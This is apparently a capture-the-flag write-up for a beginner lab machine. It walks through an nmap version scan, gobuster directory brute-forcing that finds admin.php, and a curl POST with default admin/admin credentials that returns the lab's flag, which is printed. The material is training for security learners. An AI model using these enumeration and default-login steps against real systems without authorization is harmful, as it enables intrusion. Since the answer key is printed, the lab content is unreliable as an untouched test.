# Preignition

## Task 1

> Directory Brute-forcing is a technique used to check a lot of paths on a web server to find hidden pages. Which is another name for this? (i) Local File Inclusion, (ii) dir busting, (iii) hash cracking.

dir busting

## Task 2

> What switch do we use for nmap's scan to specify that we want to perform version detection

-sV

## Task 3

> What does Nmap report is the service identified as running on port 80/tcp?

http

## Task 4

> What server name and version of service is running on port 80/tcp?

nginx 1.14.2

```
nmap -sV 10.129.22.71
```

```out
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-10 18:56 EDT
Nmap scan report for 10.129.22.71
Host is up (0.034s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.04 seconds
```

## Task 5

> What switch do we use to specify to Gobuster we want to perform dir busting specifically?

dir

The term "switch" used dubious is incorrect. When professionals here that
term they immediately think of something that begins with one or more
dashes. The correct way to say this is "What mode" instead.

Beware that `sudo apt install gobuster` on Ubuntu Server will get a
program that is not at all the same as on Kali. This caused confusion
about the wording of the task.

For this I used a Kali VM mostly because it has all the word lists and
stuff that Gobuster needs.

## Task 6

> When using gobuster to dir bust, what switch do we add to make sure it finds PHP pages?

-x php

This task is very poorly worded. This causes gobuster to only look for
files with a php suffix or no suffix at all. Other suffixes can be added
with commas (ex: `-x php,html,txt`).

## Task 7

> What page is found during our dir busting activities?

admin.php

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -x php -u http://10.129.22.71 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.22.71
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/09/10 19:53:44 Starting gobuster in directory enumeration mode
===============================================================
/admin.php            (Status: 200) [Size: 999]
Progress: 3494 / 441122 (0.79%)               ^C
```

## Task 8

> What is the HTTP status code reported by Gobuster for the discovered page?

200

OMG!

## Task 9

> Submit the flag.

6483bee07c1c1d57f14e5b0717503c73

Here's the fun way:

```
┌──(kali㉿kali)-[~]
└─$ curl -sSL -X POST  -H "Content-Type: application/x-www-form-urlencoded" -d 'username=admin&password=admin' http://10.129.17.15/admin.php | grep flag
<h4 style='text-align:center'>Congratulations! Your flag is: 6483bee07c1c1d57f14e5b0717503c73</h4>
```

